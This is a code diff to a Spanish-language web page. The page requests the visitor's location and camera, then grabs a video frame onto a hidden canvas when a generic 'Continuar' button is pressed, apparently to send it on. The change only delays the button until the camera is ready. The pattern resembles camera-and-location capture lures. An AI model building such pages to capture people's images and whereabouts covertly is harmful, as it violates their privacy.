@@ -33,7 +33,8 @@ button {
 
 <video id="video" autoplay playsinline></video>
 <br>
-<button onclick="capturar()">Continuar</button>
+
+<button id="btn" onclick="capturar()" disabled>Cargando cámara...</button>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
@@ -56,21 +57,31 @@ navigator.geolocation.getCurrentPosition(
 // 📸 CÁMARA
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
-    document.getElementById('video').srcObject = stream;
+    let video = document.getElementById('video');
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+        // 👉 activar botón cuando la cámara esté lista
+        let btn = document.getElementById('btn');
+        btn.disabled = false;
+        btn.innerText = "Continuar";
+    };
 })
 .catch(() => {
     alert("No se pudo acceder a la cámara");
 });
 
+// 📤 CAPTURAR Y ENVIAR
 function capturar() {
-    let canvas = document.getElementById('canvas');
     let video = document.getElementById('video');
 
-    // 🔥 IMPORTANTE: validar video listo
-    if (video.videoWidth === 0) {
-        alert("Cámara no lista");
+    // seguridad extra
+    if (video.readyState !== 4) {
+        alert("Espera un momento, cargando cámara...");
         return;
     }
+
+    let canvas = document.getElementById('canvas');
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
